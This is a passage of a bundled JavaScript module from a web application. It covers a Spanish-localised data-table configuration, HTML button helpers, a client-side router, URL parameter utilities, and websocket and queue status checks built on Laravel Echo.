  columnHeaderSortMulti: true,
  // ordenacion multiple
  sortOrderReverse: true,
  // ordenacion en el orden en que se pulsan las columnas
  pagination: true,
  paginationMode: "local",
  paginationSize: 30,
  paginationCounter: (pageSize, currentRow, currentPage, totalRows, totalPages) => {
    const finalCurrentRow = currentRow + (pageSize - 1);
    return `Mostrando ${currentRow} - ${finalCurrentRow} filas de ${totalRows}`;
  },
  ajaxResponse: (url, params, response) => {
    return response.data;
  },
  footerElement: `<span class="mx-1" id="footerinfo"></span>`,
  langs: {
    "es-es": {
      "columns": {
        "name": "Nombre"
        //replace the title of column name with the value "Name"
      },
      "data": {
        "loading": "Cargando",
        //data loader text
        "error": "Error"
        //data error text
      },
      "groups": {
        //copy for the auto generated item count in group header
        "item": "elemento",
        //the singular  for item
        "items": "elementos"
        //the plural for items
      },
      "pagination": {
        "page_size": "Tamao de pgina",
        //label for the page size select element
        "page_title": "Mostrar pgina",
        //tooltip text for the numeric page button, appears in front of the page number (eg. "Show Page" will result in a tool tip of "Show Page 1" on the page 1 button)
        "first": "Primera",
        //text for the first page button
        "first_title": "Primera pgina",
        //tooltip text for the first page button
        "last": "ltima",
        "last_title": "ltima pgina",
        "prev": "Anterior",
        "prev_title": "Anterior pgina",
        "next": "Siguiente",
        "next_title": "Siguiente pgina",
        "all": "Todo",
        "counter": {
          "showing": "Mostrando",
          "of": "de",
          "rows": "filas",
          "pages": "pginas"
        }
      },
      "headerFilters": {
        "default": "filtrar columna...",
        //default header filter placeholder text
        "columns": {
          "name": "filtrar nombre..."
          //replace default header filter text for column name
        }
      }
    }
  }
});
__publicField(_Ttable, "buttons", {
  linkBtnInfo: (title, url, blank) => {
    return `<a href="${url}" title="${title}" ${blank ? 'target="_blank"' : ""} ><button class="mx-1 btn btn-xs btn-info"><i class="fa fa-info-circle"></i></button></a>`;
  },
  linkBtnEdit: (title, url) => {
    return `<a href="${url}" title="${title}"><button class="mx-1 btn btn-xs btn-warning"><i class="far fa-edit"></i></button></a>`;
  },
  linkTextEdit: (title, url) => {
    return `<a href="${url}" title="${title}"><i class="far fa-edit"></i></a>`;
  },
  btnInfo: (title) => {
    return `<button class="mx-1 btn btn-xs btn-info" data-action="info" title="${title}"><i class="fa fa-info-circle"></i></button>`;
  },
  btnSave: (title, showText = false) => {
    let text = showText ? title : "";
    return `<button class="mx-1 btn btn-xs btn-success" data-action="save" title="${title}"><i class="far fa-save"></i> ${text}</button>`;
  },
  btnCancel: (title, showText = false) => {
    let text = showText ? title : "";
    return `<button class="mx-1 btn btn-xs btn-danger" data-action="cancel" title="${title}"><i class="fa fa-ban" aria-hidden="true"></i> ${text}</button>`;
  },
  btnDelete: (title, showText = false) => {
    let text = showText ? title : "";
    return `<button class="mx-1 btn btn-xs btn-danger" data-action="delete" title="${title}"><i class="fa fa-times"></i> ${text}</button>`;
  },
  btnNew: (title, id) => {
    const htmlId = id === void 0 ? "" : `id="${id}"`;
    return `<button ${htmlId} class="mx-1 btn btn-xs btn-primary" data-action="new" title="${title}"><i class="fas fa-plus-square"></i></button>`;
  },
  btnReload: (title) => {
    return `<button class="mx-1 btn btn-xs btn-info" data-action="reload" title="${title}"><i class="fa fa-sync-alt"></i></button>`;
  },
  btnMove: (title) => {
    return `<button class="mx-1 btn btn-xs btn-secondary" data-action="move" title="${title}"><i class="fas fa-suitcase-rolling"></i></button>`;
  }
});
__publicField(_Ttable, "formatterParams_lookupBoolean", { undefined: "", null: "", 0: "No", 1: "Si" });
__publicField(_Ttable, "defaultListEditorParams", {
  //Value Options (You should use ONE of these per editor)
  // values: {1: "TEST AS21 PRO", 25: "TEST MCA"}, //an array of values or value/label objects
  // valuesURL: "http://myvalues.com", //a url to load the values from
  // valuesLookup:"active", //get the values from the currently active rows in this column
  clearable: true,
  verticalNavigation: "hybrid",
  //navigate to new row when at the top or bottom of the selection list
  maxWidth: true,
  //prevent width of list item from exceeding width of cell
  placeholderLoading: "Loading list...",
  // set custom placeholder when loading list values
  placeholderEmpty: "No Results Found",
  // set custom placeholder when list is empty
  //Select Options (only available when autocomplete:false)
  // multiselect: true, //allow selection of multiple items from the list
  //Autocomplete Options (only available when autocomplete:true)
  autocomplete: true,
  //enable autocomplete mode,
  // filterRemote: true, //pass filter term to remote server in request instead of filtering
  // filterDelay: 500, //delay in milliseconds after typing before filter begins
  listOnEmpty: true
  // freetext:true, //allow the user to set the value of the cell to a free text entry
});
__publicField(_Ttable, "editorParams_listBoolean", {
  ..._Ttable.defaultListEditorParams,
  clearable: false,
  autocomplete: false,
  listOnEmpty: void 0,
  allowEmpty: false,
  values: [{ label: "No", value: 0 }, { label: "Si", value: 1 }]
});
__publicField(_Ttable, "headerFilterParams_listBoolean", { values: { 0: "No", 1: "Si" } });
const _Route = class _Route2 {
  static page(uri, callback, makeDataRequest = false) {
    if (Array.isArray(callback) && typeof makeDataRequest === "boolean") {
      const controller = callback[0];
      const method = callback[1];
      __privateGet(_Route2, _ROUTES)["PAGES"][uri] = {
        uri,
        controller,
        method,
        makeDataRequest
      };
    }
  }
  static component(callback, uris) {
    if (Array.isArray(callback) && Array.isArray(uris)) {
      const controller = callback[0];
      const method = callback[1];
      __privateGet(_Route2, _ROUTES)["COMPONENTS"][`${controller.name}_${method}`] = {
        controller,
        method,
        uris
      };
    }
  }
  static all(callback, except) {
    if (Array.isArray(callback) && Array.isArray(except)) {
      const controller = callback[0];
      const method = callback[1];
      __privateGet(_Route2, _ROUTES)["ALL"][`${controller.name}_${method}`] = {
        controller,
        method,
        except
      };
    }
  }
  static dispatch() {
    if (!_Route2.existsRoutesDefinition()) return;
    Object.values(__privateGet(_Route2, _ROUTES)["PAGES"]).forEach((page) => {
      if (s().current() === page.uri) {
        const controller = new page.controller();
        if (!page.makeDataRequest) {
          controller[page.method]();
          return;
        }
        g.newFetch({ url: s(page.uri, s().params) }).then((viewData) => {
          controller[page.method](viewData);
        }).catch((e2) => {
          g.catchCode({ error: e2 });
        });
        return;
      }
    });
    Object.values(__privateGet(_Route2, _ROUTES)["COMPONENTS"]).forEach((component) => {
      const onRoutes = component.uris;
      const currentRoute = s().current();
      if (currentRoute !== void 0 && onRoutes.includes(currentRoute)) {
        const controller = new component.controller();
        controller[component.method]();
      }
    });
    Object.values(__privateGet(_Route2, _ROUTES)["ALL"]).forEach((component) => {
      const exceptRoutes = component.except;
      const currentRoute = s().current();
      if (currentRoute !== void 0 && !exceptRoutes.includes(currentRoute)) {
        const controller = new component.controller();
        controller[component.method]();
      }
    });
  }
  static existsRoutesDefinition() {
    const routeVariable = s();
    return routeVariable.t.hasOwnProperty("url");
  }
};
_ROUTES = /* @__PURE__ */ new WeakMap();
__privateAdd(_Route, _ROUTES, {
  PAGES: {},
  COMPONENTS: {},
  ALL: {}
});
let Route = _Route;
const _Url = class _Url2 {
  static getCurrentUrl() {
    const current = s().current();
    const params = s().params;
    return s(current, params);
  }
  static addParamsToUrl(objectQueryParams, onStart = false) {
    let currentParams = s().params;
    let params = onStart ? { ...objectQueryParams, ...currentParams } : { ...currentParams, ...objectQueryParams };
    __privateMethod(this, _Url_static, updateUrl_fn).call(this, params);
  }
  static removeParamsUrl(paramsToDelete) {
    let currentParams = s().params;
    paramsToDelete.forEach((item) => {
      delete currentParams[item];
    });
    __privateMethod(this, _Url_static, updateUrl_fn).call(this, currentParams);
  }
  static getEncodedFilters() {
    var _a, _b;
    return ((_b = (_a = s()) == null ? void 0 : _a.params) == null ? void 0 : _b.filters) ?? null;
  }
  static getDecodedFilters() {
    const filters = _Url2.getEncodedFilters();
    let decodedFilters = null;
    if (filters) {
      try {
        decodedFilters = decodeURIComponent(filters);
        decodedFilters = JSON.parse(decodedFilters);
      } catch (e2) {
        g.catchCode({ error: e2 });
        return null;
      }
    }
    return decodedFilters;
  }
};
_Url_static = /* @__PURE__ */ new WeakSet();
updateUrl_fn = function(params) {
  const newUrl = s(s().current(), params);
  window.history.pushState({}, "", newUrl);
};
__privateAdd(_Url, _Url_static);
const _Websocket = class _Websocket2 {
  constructor() {
    var _a, _b;
    (_a = document.getElementById("btnCheckWebsockets")) == null ? void 0 : _a.addEventListener("click", () => {
      _Websocket2.checkWebsocketsService().then();
    });
    (_b = document.getElementById("btnCheckQueues")) == null ? void 0 : _b.addEventListener("click", () => {
      var _a2;
      __privateMethod(_a2 = _Websocket2, _Websocket_static, checkQueuesService_fn).call(_a2).then();
    });
    if (__const("VITE_BROADCASTING_ENABLED")) {
      window.Echo.channel("check-websockets-status").listen(".EventCheckWebsocketsStatus", () => {
        var _a2;
        _Websocket2.STORAGE.setAsWorked();
        __privateMethod(_a2 = _Websocket2, _Websocket_static, checkStorageAndToggleError_fn).call(_a2);
      });
      window.Echo.channel("check-queues-status").listen(".EventCheckQueuesStatus", (res) => {
        _Websocket2.toggleErrorQueues(res.response);
      });
    }
  }
  static async checkWebsocketsService() {
    var _a;
    g.addSpinner(_Websocket2.divMessageWebsockets);
    try {
      EchoService.checkAndUpdateConnectedStatus();
      const ajaxResult = await g.newFetch({ url: s(__const("routeName_websockets_checkService")) });
      _Websocket2.checkBroadcastingFetch({ result: ajaxResult });
      g.removeSpinner(_Websocket2.divMessageWebsockets);
    } catch (e2) {
      g.catchCode({ error: e2, from: "Websocket->checkWebsocketsService()" });
      __privateMethod(_a = _Websocket2, _Websocket_static, checkStorageAndToggleError_fn).call(_a);
    }
  }
  static toggleErrorQueues(res) {
    var _a, _b;
    if (res.success) {
      (_a = _Websocket2.divMessageQueues) == null ? void 0 : _a.classList.add("d-none");
    } else {
      (_b = _Websocket2.divMessageQueues) == null ? void 0 : _b.classList.remove("d-none");
    }
  }
  startListenChannel(channelName, events2) {
    if (__const("VITE_BROADCASTING_ENABLED")) {
      let channel = window.Echo.channel(channelName);
      events2.forEach((event) => {
        channel = channel.listen(event.event, (e2) => {
          var _a;
          _Websocket2.STORAGE.setAsWorked();
          __privateMethod(_a = _Websocket2, _Websocket_static, checkStorageAndToggleError_fn).call(_a);
          event.callback(e2);
        });
      });
    }
  }
  static checkBroadcastingFetch({ result, onError, showAlert = false }) {
    var _a, _b;
    if (!((_a = result.data) == null ? void 0 : _a.hasOwnProperty("broadcasting"))) return;
    const resultB = result;
    if (showAlert) {
      SModal.toastBoth({ success: resultB.success, title: resultB.message }).then();
    }
    const emittingEventHasFailed = !resultB.data.broadcasting.success || EchoService.isFailed();
    if (!__const("VITE_BROADCASTING_ENABLED") || emittingEventHasFailed) {
      _Websocket2.STORAGE.setAsFailed();
      if (typeof onError === "function") onError(resultB);
    }
    __privateMethod(_b = _Websocket2, _Websocket_static, checkStorageAndToggleError_fn).call(_b);
  }
};
_Websocket_static = /* @__PURE__ */ new WeakSet();
checkQueuesService_fn = async function() {
  g.addSpinner(_Websocket.divMessageQueues);
  let result;
  try {
    result = await g.newFetch({ url: s(__const("routeName_queues_checkService")) });
  } catch (e2) {
    result = e2;
    g.catchCode({ error: e2, from: "Websocket->checkQueuesService()" });
  } finally {
    if (result !== void 0) _Websocket.checkBroadcastingFetch({
      result,
      onError: (res) => _Websocket.toggleErrorQueues(res)
    });
    g.removeSpinner(_Websocket.divMessageQueues);
  }
};
checkStorageAndToggleError_fn = function() {
  if (!_Websocket.divMessageWebsockets) return;
  if (_Websocket.STORAGE.check()) {
    _Websocket.divMessageWebsockets.classList.remove("d-none");
  } else {
    _Websocket.divMessageWebsockets.classList.add("d-none");
  }
};
__privateAdd(_Websocket, _Websocket_static);
__publicField(_Websocket, "STORAGE", {
  check() {
    return LStorage.getItem("websocketsFailed") === "1";
  },
  setAsFailed() {
    LStorage.setItem("websocketsFailed", "1");
  },
  setAsWorked() {
    LStorage.setItem("websocketsFailed", "0");
  }
});
__publicField(_Websocket, "divMessageWebsockets", document.querySelector("#websocketsErrorMessage"));
__publicField(_Websocket, "divMessageQueues", document.querySelector("#queuesErrorMessage"));
let Websocket = _Websocket;
const _EchoService = class _EchoService2 {
  static start() {
    if (!__const("VITE_BROADCASTING_ENABLED")) return;
    window.Pusher = Pusher$1;
    window.Echo = new Echo({
      broadcaster: "reverb",
      key: __const("VITE_REVERB_APP_KEY"),
      wsHost: __const("VITE_REVERB_HOST"),
      wsPort: __const("VITE_REVERB_PORT") ?? 80,
      wssPort: __const("VITE_REVERB_PORT") ?? 443,
      forceTLS: (__const("VITE_REVERB_SCHEME") ?? "https") === "https",
      enabledTransports: ["ws", "wss"]
    });
    const pusherErrorFunction = (error2, type) => {
      __privateSet(_EchoService2, _connectionFailed, true);
      console.error(`[-------------------------------------------------------------]`);
      console.error(`Ha habido un error en la conexion con los websockets [${type}]:`);
      console.error(error2);
    };
    const pusherSuccessFunction = (type) => {
      __privateSet(_EchoService2, _connectionFailed, false);
      console.info(`[${type}]`);
    };
    const echoConnection = window.Echo.connector.pusher.connection;
    echoConnection.bind("state_change", (states) => {
      console.info(`pusher.connection.state changed to [${states.current}]`);
      Websocket.checkWebsocketsService().then();
    });
    echoConnection.bind("initialized", () => console.info("[initialized]"));
    echoConnection.bind("connecting", () => console.info("[connecting]"));
    echoConnection.bind("connected", () => pusherSuccessFunction("connected"));
    echoConnection.bind("error", (error2) => pusherErrorFunction(error2, "error"));
    echoConnection.bind("failed", (error2) => pusherErrorFunction(error2, "failed"));
    echoConnection.bind("disconnected", (error2) => pusherErrorFunction(error2, "disconnected"));
    echoConnection.bind("unavailable", (error2) => pusherErrorFunction(error2, "unavailable"));
  }
  // -----------------------------------------------------------------------------------------------------------------
  // ----- GETTERS AND SETTERS----------------------------------------------------------------------------------------
  static isFailed() {
    return __privateGet(_EchoService2, _connectionFailed) === true;
  }
  static checkAndUpdateConnectedStatus() {
    if (!__privateGet(_EchoService2, _isStarted)) return;
    const echoConnection = window.Echo.connector.pusher.connection;
    if (__privateGet(_EchoService2, _connectionFailed) === true && echoConnection.state === "connected") {
      __privateSet(_EchoService2, _connectionFailed, false);
    }
  }
};
_connectionFailed = /* @__PURE__ */ new WeakMap();
_isStarted = /* @__PURE__ */ new WeakMap();
__privateAdd(_EchoService, _connectionFailed, null);
__privateAdd(_EchoService, _isStarted, false);
let EchoService = _EchoService;
class LayoutListenersUseCase extends Instantiable {
  __invoke() {
    LStorage.checkAndUpdateVersion();
    DomService.new().startDarkMode();
    DomService.new().startSidebarState();
  }
}
class UtilitiesServiceProvider {
  static features(actions2) {
    actions2.forEach((item) => {
      const action = this.actions[item];
      action();
    });
  }
}
__publicField(UtilitiesServiceProvider, "actions", {
  startStorageDay: () => {
    if (LStorage.isFirstConnectionInDay()) {
      LStorage.setNowAsLastConnection();
      LStorage.removeItem("websocketsFailed");
    }
  },
  enableTooltips: () => {
    g.startTooltips();
  },
  registerGlobalError: () => {
    window.onerror = (message, source, lineno, colno, error2) => {
      return g.handleGlobalError(error2);
    };
  },
  enableNotifications: () => {
    Notify.checkAndRequestPermission();
  },
  startLayoutListeners: () => {
    LayoutListenersUseCase.new().__invoke();
  }
});
export {
  Constants as C,
  Html as H,
  Route as R,
  Translator as T,
  UtilitiesServiceProvider as U
};
